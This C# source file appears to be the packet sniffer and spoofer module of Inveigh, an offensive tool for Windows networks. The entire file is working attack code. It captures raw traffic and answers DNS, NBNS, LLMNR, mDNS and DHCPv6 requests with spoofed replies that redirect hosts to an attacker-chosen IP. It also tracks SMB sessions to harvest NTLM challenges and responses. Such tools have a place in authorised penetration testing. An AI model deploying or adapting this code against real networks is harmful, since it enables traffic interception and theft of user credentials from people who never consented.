using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Collections;

namespace Inveigh
{
    class Sniffer
    {
        public static FileStream pcapFile = null;
        static Hashtable tcpSessionTable = Hashtable.Synchronized(new Hashtable());

        public static void SnifferSpoofer(string ipVersion, string snifferIP, string snifferMAC, string spooferIP, string spooferIPv6, string dnsDomainController, string dnsTTL, string llmnrTTL, string mdnsTTL, string nbnsTTL, string[] dnsTypes, string[] mdnsQuestions, string[] mdnsTypes, string[] nbnsTypes, string dhcpv6DomainSuffix, string[] pcapTCP, string[] pcapUDP)
        {
            byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
            byte[] spooferIPv6Data = new byte[16];
            byte[] byteIn = new byte[4] { 1, 0, 0, 0 };
            byte[] byteOut = new byte[4] { 1, 0, 0, 0 };
            byte[] byteData = new byte[65534];
            Socket snifferSocket;
            IPEndPoint snifferEndPoint;
            EndPoint snifferEndPointRemote;
            IPAddress destinationIPAddress = IPAddress.Parse(snifferIP);
            int i = 0;
            int dhcpv6IPIndex = 1;
            Random ipv6Random = new Random();
            int ipv6RandomValue = ipv6Random.Next(1, 9999);
            byte[] snifferMACArray = new byte[6];
            byte[] dhcpv6DomainSuffixData = Util.NewDNSNameArray(dhcpv6DomainSuffix, true);
            var ipVersionAddressFamily = AddressFamily.InterNetwork;

            if (String.Equals(ipVersion, "IPv6"))
            {
                spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
                snifferEndPointRemote = new IPEndPoint(IPAddress.IPv6Any, 0);
                ipVersionAddressFamily = AddressFamily.InterNetworkV6;

                foreach (string character in snifferMAC.Split(':'))
                {
                    snifferMACArray[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                    i++;
                }

            }
            else
            {
                snifferEndPointRemote = new IPEndPoint(IPAddress.Any, 0);
            }

            try
            {
                
                if (String.Equals(ipVersion, "IPv4"))
                {
                    snifferSocket = new Socket(ipVersionAddressFamily, SocketType.Raw, ProtocolType.IP);                  
                }
                else
                {
                    snifferSocket = new Socket(ipVersionAddressFamily, SocketType.Raw, ProtocolType.Udp);
                }

                snifferEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
                snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                snifferSocket.ReceiveBufferSize = 65534;
                snifferSocket.Bind(snifferEndPoint);
                snifferSocket.IOControl(IOControlCode.ReceiveAll, byteIn, byteOut);
            }
            catch
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[-] Error starting packet sniffer, check if shell has elevated privilege or set -Elevated N for unprivileged mode.", DateTime.Now.ToString("s")));
                }

                throw;
            }         
            
            int packetLength;
            string outputPcap = "";

            if (Program.enabledPcap)
            {
                byte[] pcapHeader = new byte[24] { 0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 };
                outputPcap = Path.Combine(Program.argFileOutputDirectory, String.Concat(Program.argFilePrefix, "-Packets.pcap"));
                bool existsPcapFile = File.Exists(outputPcap);

                pcapFile = new FileStream(outputPcap, FileMode.Append, FileAccess.Write);

                if (!existsPcapFile)
                {
                    pcapFile.Write(pcapHeader, 0, pcapHeader.Length);
                }

            }

            while (!Program.exitInveigh)
            {

                try
                {

                    try
                    {
                        packetLength = snifferSocket.ReceiveFrom(byteData, 0, byteData.Length, SocketFlags.None, ref snifferEndPointRemote);
                    }
                    catch
                    {
                        packetLength = 0;
                    }

                    if (packetLength > 0)
                    {
                        MemoryStream memoryStream = new MemoryStream(byteData, 0, packetLength);
                        BinaryReader binaryReader = new BinaryReader(memoryStream);
                        IPAddress sourceIPAddress;
                        int protocolNumber;
                        byte[] sourceIP = new byte[4];
                        byte[] destinationIP = new byte[4];


                        if (String.Equals(ipVersion, "IPv4"))
                        {
                            byte versionHL = binaryReader.ReadByte();
                            binaryReader.ReadByte();
                            uint totalLength = Util.DataToUInt16(binaryReader.ReadBytes(2)); //this is 0 with tcp offload
                            binaryReader.ReadBytes(5);
                            protocolNumber = (int)binaryReader.ReadByte();
                            binaryReader.ReadBytes(2);
                            sourceIP = binaryReader.ReadBytes(4);
                            sourceIPAddress = new IPAddress(sourceIP);
                            destinationIP = binaryReader.ReadBytes(4);
                            destinationIPAddress = new IPAddress(destinationIP);
                            byte headerLength = versionHL;
                            headerLength <<= 4;
                            headerLength >>= 4;
                            headerLength *= 4;
                        }
                        else
                        {
                            sourceIPAddress = IPAddress.Parse(snifferEndPointRemote.ToString().Substring(0, snifferEndPointRemote.ToString().Length - 2));
                            protocolNumber = (int)snifferSocket.ProtocolType;
                        }

                        switch (protocolNumber)
                        {
                            case 6:
                                uint tcpSourcePort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                uint tcpDestinationPort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(8);
                                byte tcpHeaderLength = binaryReader.ReadByte();
                                tcpHeaderLength >>= 4;
                                tcpHeaderLength *= 4;
                                byte tcpFlags = binaryReader.ReadByte();
                                binaryReader.ReadBytes(tcpHeaderLength - 15);
                                byte[] payloadBytes = binaryReader.ReadBytes(packetLength);
                                string challenge = "";
                                string session = "";
                                string tcpSession = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);
                                string tcpFlagsBinary = Convert.ToString(tcpFlags, 2);
                                tcpFlagsBinary = tcpFlagsBinary.PadLeft(8, '0');

                                if (String.Equals(tcpFlagsBinary.Substring(6, 1), "1") && String.Equals(tcpFlagsBinary.Substring(3, 1), "0") && destinationIPAddress.ToString() == snifferIP)
                                {

                                    lock (Program.outputList)
                                    {
                                        Program.outputList.Add(String.Format("[+] [{0}] TCP({1}) SYN packet from {2}", DateTime.Now.ToString("s"), tcpDestinationPort, tcpSession));
                                    }

                                }

                                switch (tcpDestinationPort)
                                {
                                    case 139:

                                        if (payloadBytes.Length > 0)
                                        {
                                            SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), destinationIPAddress.ToString(), Convert.ToString(tcpSourcePort), "139");
                                        }

                                        session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                        if (Program.smbSessionTable.ContainsKey(session))
                                        {
                                            NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", "139");
                                        }

                                        break;

                                    case 445:

                                        if (payloadBytes.Length > 0)
                                        {
                                            SMBConnection(payloadBytes, snifferIP, sourceIPAddress.ToString(), destinationIPAddress.ToString(), Convert.ToString(tcpSourcePort), "445");
                                        }

                                        session = sourceIPAddress.ToString() + ":" + Convert.ToString(tcpSourcePort);

                                        if (Program.smbSessionTable.ContainsKey(session))
                                        {
                                            NTLM.GetNTLMResponse(payloadBytes, sourceIPAddress.ToString(), Convert.ToString(tcpSourcePort), "SMB", "445");
                                        }

                                        break;
                                }

                                switch (tcpSourcePort)
                                {
                                    case 139:

                                        if (payloadBytes.Length > 0)
                                        {
                                            challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                        }

                                        session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                        if (!string.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                        {

                                            if(!String.Equals(destinationIP,snifferIP))
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }
                                            else
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} from {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }

                                            Program.smbSessionTable[session] = challenge;
                                        }

                                        break;

                                    case 445:

                                        if (payloadBytes.Length > 0)
                                        {
                                            challenge = NTLM.GetSMBNTLMChallenge(payloadBytes);
                                        }

                                        session = destinationIPAddress.ToString() + ":" + Convert.ToString(tcpDestinationPort);

                                        if (!String.IsNullOrEmpty(challenge) && destinationIP != sourceIP)
                                        {

                                            if (!String.Equals(destinationIP, snifferIP))
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} sent to {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }
                                            else
                                            {

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) NTLM challenge {2} from {3}", DateTime.Now.ToString("s"), tcpSourcePort, challenge, session));
                                                }

                                            }

                                            Program.smbSessionTable[session] = challenge;
                                        }

                                        break;
                                }

                                if (Program.enabledPcap && String.Equals(ipVersion, "IPv4") && (pcapTCP != null && pcapTCP.Length > 0 && (Array.Exists(pcapTCP, element => element == tcpSourcePort.ToString()) || 
                                    Array.Exists(pcapTCP, element => element == tcpDestinationPort.ToString()) || Array.Exists(pcapTCP, element => element == "ALL"))))
                                {
                                    PcapOutput((uint)packetLength, byteData);
                                }

                                break;

                            case 17:
                                byte[] udpSourcePort = binaryReader.ReadBytes(2);
                                uint endpointSourcePort = Util.DataToUInt16(udpSourcePort);
                                uint udpDestinationPort = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                uint udpLength = Util.DataToUInt16(binaryReader.ReadBytes(2));
                                binaryReader.ReadBytes(2);
                                byte[] udpPayload;

                                try
                                {
                                    udpPayload = binaryReader.ReadBytes(((int)udpLength - 2) * 4);
                                }
                                catch
                                {
                                    udpPayload = new byte[2];
                                }

                                switch (udpDestinationPort)
                                {

                                    case 53:
                                        string dnsRequestHost = Util.ParseNameQuery(12, udpPayload);
                                        byte[] dnsRequest = new byte[dnsRequestHost.Length + 2];
                                        System.Buffer.BlockCopy(udpPayload, 12, dnsRequest, 0, dnsRequest.Length);           
                                        string[] dnsRequestSplit = dnsRequestHost.Split('.');
                                        byte[] dnsRequestRecordType = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, (dnsRequest.Length + 12), dnsRequestRecordType, 0, 2);
                                        string dnsRecordType = Util.GetRecordType(dnsRequestRecordType);
                                        string dnsResponseMessage = Util.CheckRequest(dnsRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "DNS", dnsRecordType, dnsTypes);

                                        if (Program.enabledDNS && String.Equals(dnsResponseMessage, "response sent"))
                                        {

                                            if ((int)udpPayload[2] != 40)
                                            {
                                                byte[] dnsResponse = DNS.GetDNSResponse("sniffer", ipVersion, dnsDomainController, dnsTTL, dnsRecordType, sourceIPAddress, destinationIPAddress, spooferIPData, udpSourcePort, udpPayload);
                                                UDP.UDPSnifferClient(null, 0, sourceIPAddress, (int)endpointSourcePort, ipVersion, dnsResponse);
                                            }
                                            else
                                            {
                                                byte[] dnsResponse = DNS.GetDNSResponse("sniffer", ipVersion, dnsDomainController, dnsTTL, dnsRecordType, sourceIPAddress, destinationIPAddress, spooferIPData, udpSourcePort, udpPayload);
                                                UDP.UDPSnifferClient(null, 0, sourceIPAddress, (int)endpointSourcePort, ipVersion, dnsResponse);
                                            }

                                        }

                                        if (String.Equals(destinationIPAddress.ToString(), snifferIP.ToString()))
                                        {

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] DNS({1}) request for {2} from {3} [{4}]", DateTime.Now.ToString("s"), dnsRecordType, dnsRequestHost, sourceIPAddress, dnsResponseMessage));
                                            }

                                        }
                                        else
                                        {

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] DNS({1}) request for {2} sent to {3} [{4}]", DateTime.Now.ToString("s"), dnsRecordType, dnsRequestHost, destinationIPAddress, "outgoing query"));
                                            }

                                        }                                      

                                        break;

                                    case 137:

                                        if (String.Equals(ipVersion, "IPv4"))
                                        {
                                            byte[] nbnsQuestionsAnswerRRs = new byte[4];
                                            System.Buffer.BlockCopy(udpPayload, 4, nbnsQuestionsAnswerRRs, 0, 4);
                                            byte[] nbnsAdditionalRRs = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 10, nbnsAdditionalRRs, 0, 2);

                                            if (String.Equals(BitConverter.ToString(nbnsQuestionsAnswerRRs), "00-01-00-00") && !String.Equals(BitConverter.ToString(nbnsAdditionalRRs), "00-01"))
                                            {
                                                byte[] nbnsRequestType = new byte[2];
                                                System.Buffer.BlockCopy(udpPayload, 43, nbnsRequestType, 0, 2);
                                                string nbnsQueryType = NBNS.NBNSQueryType(nbnsRequestType);
                                                byte[] nbnsType = new byte[1];
                                                System.Buffer.BlockCopy(udpPayload, 47, nbnsType, 0, 1);
                                                byte[] nbnsRequest = new byte[udpPayload.Length - 20];
                                                System.Buffer.BlockCopy(udpPayload, 13, nbnsRequest, 0, nbnsRequest.Length);
                                                string nbnsRequestHost = NBNS.BytesToNBNSQuery(nbnsRequest);
                                                string nbnsResponseMessage = Util.CheckRequest(nbnsRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), "NBNS", nbnsQueryType, nbnsTypes);

                                                if (Program.enabledNBNS && String.Equals(nbnsResponseMessage, "response sent"))
                                                {

                                                    if (Array.Exists(nbnsTypes, element => element == nbnsQueryType) && !String.Equals(BitConverter.ToString(nbnsType), "21"))
                                                    {
                                                        byte[] nbnsResponse = NBNS.GetNBNSResponse("sniffer", nbnsTTL, spooferIPData, udpSourcePort, udpPayload);
                                                        UDP.UDPSnifferClient(null, 0, sourceIPAddress, (int)endpointSourcePort, ipVersion, nbnsResponse);
                                                    }
                                                    else if (String.Equals(BitConverter.ToString(nbnsType), "21"))
                                                    {
                                                        nbnsResponseMessage = "NBSTAT request";
                                                    }
                                                    else
                                                    {
                                                        nbnsResponseMessage = "NBNS type disabled";
                                                    }

                                                }

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] NBNS request for {1}<{2}> from {3} [{4}]", DateTime.Now.ToString("s"), nbnsRequestHost, nbnsQueryType, sourceIPAddress, nbnsResponseMessage));
                                                }

                                            }

                                        }

                                        break;

                                    case 547:

                                        if (String.Equals(ipVersion, "IPv6"))
                                        {
                                            byte[] dhcpv6MessageTypeID = new byte[1];
                                            Buffer.BlockCopy(udpPayload, 0, dhcpv6MessageTypeID, 0, 1);
                                            byte[] dhcpv6ClientMACData = new byte[6];
                                            Buffer.BlockCopy(udpPayload, 22, dhcpv6ClientMACData, 0, 6);
                                            string dhcpv6ClientMAC = BitConverter.ToString(dhcpv6ClientMACData).Replace("-", ":");
                                            byte[] dhcpv6IAID = new byte[4];

                                            if ((int)dhcpv6MessageTypeID[0] == 1)
                                            {
                                                Buffer.BlockCopy(udpPayload, 32, dhcpv6IAID, 0, 4);
                                            }
                                            else
                                            {
                                                Buffer.BlockCopy(udpPayload, 46, dhcpv6IAID, 0, 4);
                                            }

                                            byte[] dhcpv6ClientIP = new byte[16];
                                            string dhcpv6LeaseIP = "";
                                            string dhcpv6FQDN = dhcpv6ClientMAC;

                                            if ((int)dhcpv6MessageTypeID[0] == 1 || (int)dhcpv6MessageTypeID[0] == 3 || (int)dhcpv6MessageTypeID[0] == 5)
                                            {

                                                for (i = 12; i < udpPayload.Length; i++)
                                                {

                                                    if (Util.UInt16DataLength(i, udpPayload) == 39)
                                                    {
                                                        dhcpv6FQDN = Util.ParseNameQuery((i + 4), udpPayload);
                                                    }

                                                }

                                                int index = BitConverter.ToString(udpPayload).Replace("-", String.Empty).IndexOf("4D53465420352E30");

                                                if ((int)dhcpv6MessageTypeID[0] == 5)
                                                {
                                                    dhcpv6LeaseIP = sourceIPAddress.ToString();
                                                    dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                                                }
                                                else if (index >= 0 && Program.dhcpv6ClientTable.ContainsKey(dhcpv6FQDN))
                                                {
                                                    dhcpv6LeaseIP = Program.dhcpv6ClientTable[dhcpv6FQDN].ToString();
                                                    dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                                                }
                                                else if (index >= 0 && !Program.dhcpv6ClientTable.ContainsKey(dhcpv6FQDN))
                                                {
                                                    dhcpv6LeaseIP = "fe80::" + ipv6RandomValue + ":" + dhcpv6IPIndex;
                                                    dhcpv6ClientIP = IPAddress.Parse(dhcpv6LeaseIP).GetAddressBytes();
                                                }

                                                if (index >= 0 && !Program.dhcpv6ClientTable.ContainsKey(dhcpv6FQDN))
                                                {
                                                    Program.dhcpv6ClientTable.Add(dhcpv6FQDN, dhcpv6LeaseIP);
                                                    dhcpv6IPIndex++;

                                                    lock (Program.dhcpv6FileList)
                                                    {
                                                        Program.dhcpv6FileList.Add(dhcpv6FQDN + "," + dhcpv6LeaseIP);
                                                    }

                                                }

                                                string dhcpv6ResponseMessage = DHCPv6.DHCPv6Output(dhcpv6ClientMAC, dhcpv6FQDN, dhcpv6LeaseIP, sourceIPAddress.ToString(), snifferMAC, index, (int)dhcpv6MessageTypeID[0]);

                                                if (String.Equals(dhcpv6ResponseMessage, "response sent"))
                                                {
                                                    byte[] dhcpv6Response = DHCPv6.GetDHCPv6Response("sniffer", dhcpv6DomainSuffix, sourceIPAddress, destinationIPAddress, dhcpv6ClientIP, spooferIPv6Data, snifferMACArray, udpSourcePort, udpPayload);
                                                    UDP.UDPSnifferClient(destinationIPAddress, 547, sourceIPAddress, 546, ipVersion, dhcpv6Response);
                                                }

                                            }

                                        }

                                        break;

                                    case 5353:

                                        if (String.Equals(ipVersion, "IPv4"))
                                        {
                                            string mdnsResponseMessage = "";
                                            byte[] mdnsType = new byte[2];

                                            if (BitConverter.ToString(udpPayload).EndsWith("-00-01-80-01") && String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00"))
                                            {
                                                //udpLength += 10;
                                                byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
                                                Array.Reverse(ttlMDNS);
                                                byte[] mdnsTransactionID = new byte[2];
                                                string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                                                System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                                                byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                                                System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                                                string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                                                if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                                                {
                                                    mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "MDNS", "QU", mdnsQuestions);
                                                }

                                                if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                                                {

                                                    if (Array.Exists(mdnsQuestions, element => element == "QU"))
                                                    {
                                                        byte[] mdnsResponse = MDNS.GetMDNSResponse("sniffer", ipVersion, mdnsTTL, sourceIPAddress, destinationIPAddress, spooferIPData, spooferIPv6Data, udpSourcePort, udpPayload);
                                                        UDP.UDPSnifferClient(null, 0, sourceIPAddress, (int)endpointSourcePort, ipVersion, mdnsResponse);
                                                    }
                                                    else
                                                    {
                                                        mdnsResponseMessage = "mDNS type disabled";
                                                    }

                                                }

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                                                }

                                            }
                                            else if (BitConverter.ToString(udpPayload).EndsWith("-00-01") && (String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-01-00-00-00-00-00-00") ||
                                                String.Equals(BitConverter.ToString(udpPayload).Substring(12, 23), "00-02-00-00-00-00-00-00")))
                                            {
                                                //udpLength += 4;
                                                byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
                                                Array.Reverse(ttlMDNS);
                                                byte[] mdnsTransactionID = new byte[2];
                                                System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
                                                string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
                                                byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
                                                System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                                                string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');

                                                if (mdnsRequestSplit != null && mdnsRequestSplit.Length > 0)
                                                {
                                                    mdnsResponseMessage = Util.CheckRequest(mdnsRequestSplit[0], sourceIPAddress.ToString(), snifferIP.ToString(), "MDNS", "QM", mdnsQuestions);
                                                }

                                                if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                                                {

                                                    if (Array.Exists(mdnsQuestions, element => element == "QM"))
                                                    {
                                                        byte[] mdnsResponse = MDNS.GetMDNSResponse("sniffer", ipVersion, mdnsTTL, sourceIPAddress, destinationIPAddress, spooferIPData, spooferIPv6Data, udpSourcePort, udpPayload);
                                                        UDP.UDPSnifferClient(null, 0, IPAddress.Parse("224.0.0.251"), 5353, ipVersion, mdnsResponse);
                                                    }
                                                    else
                                                    {
                                                        mdnsResponseMessage = "mDNS type disabled";
                                                    }

                                                }

                                                lock (Program.outputList)
                                                {
                                                    Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1} from {2} [{3}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, sourceIPAddress, mdnsResponseMessage));
                                                }

                                            }

                                        }

                                        break;

                                    case 5355:
                                        string llmnrResponseMessage = "";
                                        byte[] ttlLLMNR = BitConverter.GetBytes(Int32.Parse(llmnrTTL));
                                        Array.Reverse(ttlLLMNR);
                                        byte[] llmnrType = new byte[2];
                                        System.Buffer.BlockCopy(udpPayload, (udpPayload.Length - 4), llmnrType, 0, 2);

                                        if (String.Equals(ipVersion, "IPv4") && !String.Equals(BitConverter.ToString(llmnrType), "00-1C") || String.Equals(ipVersion, "IPv6") && String.Equals(BitConverter.ToString(llmnrType), "00-1C"))
                                        {
                                            udpLength += (byte)(udpPayload.Length - 2);
                                            Array.Reverse(udpSourcePort);
                                            byte[] llmnrTransactionID = new byte[2];
                                            System.Buffer.BlockCopy(udpPayload, 0, llmnrTransactionID, 0, 2);
                                            byte[] llmnrRequest = new byte[udpPayload.Length - 18];
                                            byte[] llmnrRequestLength = new byte[1];
                                            System.Buffer.BlockCopy(udpPayload, 12, llmnrRequestLength, 0, 1);
                                            System.Buffer.BlockCopy(udpPayload, 13, llmnrRequest, 0, llmnrRequest.Length);
                                            string llmnrRequestHost = Util.ParseNameQuery(12, udpPayload);
                                            string llmnrVersion = "LLMNR";

                                            if (String.Equals(ipVersion, "IPv6"))
                                            {
                                                llmnrVersion = "LLMNRv6";
                                            }

                                            llmnrResponseMessage = Util.CheckRequest(llmnrRequestHost, sourceIPAddress.ToString(), snifferIP.ToString(), llmnrVersion, null, null);

                                            if (String.Equals(llmnrResponseMessage, "response sent"))
                                            {
                                                byte[] llmnrResponse = LLMNR.GetLLMNRResponse("sniffer", ipVersion, llmnrTTL, sourceIPAddress, destinationIPAddress, spooferIPData, spooferIPv6Data, udpSourcePort, udpPayload);
                                                UDP.UDPSnifferClient(null, 0, sourceIPAddress, (int)endpointSourcePort, ipVersion, llmnrResponse);
                                            }

                                            lock (Program.outputList)
                                            {
                                                Program.outputList.Add(String.Format("[+] [{0}] {1} request for {2} from {3} [{4}]", DateTime.Now.ToString("s"), llmnrVersion, llmnrRequestHost, sourceIPAddress, llmnrResponseMessage));
                                            }

                                        }

                                        break;

                                }

                                if (Program.enabledPcap && String.Equals(ipVersion, "IPv4") && (pcapUDP != null && pcapUDP.Length > 0 && (Array.Exists(pcapUDP, element => element == udpSourcePort.ToString()) ||
                                   Array.Exists(pcapUDP, element => element == udpDestinationPort.ToString()) || Array.Exists(pcapUDP, element => element == "ALL"))))
                                {
                                    PcapOutput((uint)packetLength, byteData);
                                }

                                break;
             
                        }

                    }

                }
                catch (Exception ex)
                {
                    Program.outputList.Add(String.Format("[-] [{0}] Packet sniffing error detected - {1}", DateTime.Now.ToString("s"), ex.ToString()));
                }

            }

        }

        public static void PcapOutput(uint totalLength, byte[] byteData)
        {

            if (byteData != null && byteData.Length > 0)
            {
                TimeSpan pcapEpochTime = DateTime.UtcNow - new DateTime(1970, 1, 1);
                byte[] pcapLength = BitConverter.GetBytes(totalLength + 14);
                byte[] pcapEpochTimeSeconds = BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds);

                using (MemoryStream ms = new MemoryStream())
                {
                    ms.Write((BitConverter.GetBytes((int)Math.Truncate(pcapEpochTime.TotalSeconds))), 0, (BitConverter.GetBytes((int)pcapEpochTime.TotalSeconds)).Length);
                    ms.Write((BitConverter.GetBytes(pcapEpochTime.Milliseconds)), 0, (BitConverter.GetBytes(pcapEpochTime.Milliseconds)).Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write(pcapLength, 0, pcapLength.Length);
                    ms.Write((new byte[12] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }), 0, 12);
                    ms.Write((new byte[2] { 0x08, 0x00 }), 0, 2);
                    ms.Write(byteData, 0, (int)totalLength);

                    if (ms.ToArray().Length == totalLength + 30)
                    {
                        pcapFile.Write(ms.ToArray(), 0, ms.ToArray().Length);
                    }

                }

            }

        }

        public static void SMBConnection(byte[] field, string snifferIP, string sourceIP, string destinationIP, string sourcePort, string smbPort)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            string sessionOutgoing = destinationIP + ":" + smbPort;
            int index = payload.IndexOf("FF534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 8), 2) == "72" && !String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), smbPort, session));
                }

            }
            else if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) outgoing negotiation request detected to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("FE534D42");

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && !String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) negotiation request detected from {2}", DateTime.Now.ToString("s"), smbPort, session));
                }

            }
            else if (!Program.smbSessionTable.ContainsKey(session) && index > 0 && payload.Substring((index + 24), 4) == "0000" && String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) outgoing negotiation request detected to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                }

            }

            if (!Program.smbSessionTable.ContainsKey(session) && index > 0)
            {
                Program.smbSessionTable.Add(session, "");
            }

            index = payload.IndexOf("2A864886F7120102020100");

            if (index > 0 && !String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) Kerberos authentication preferred from {2}", DateTime.Now.ToString("s"), smbPort, session));
                }

            }
            else if (index > 0 && String.Equals(sourceIP, snifferIP))
            {

                lock (Program.outputList)
                {
                    Program.outputList.Add(String.Format("[+] [{0}] SMB({1}) Kerberos authentication preferred to {2}", DateTime.Now.ToString("s"), sourcePort, sessionOutgoing));
                }

            }

        }

    }
}
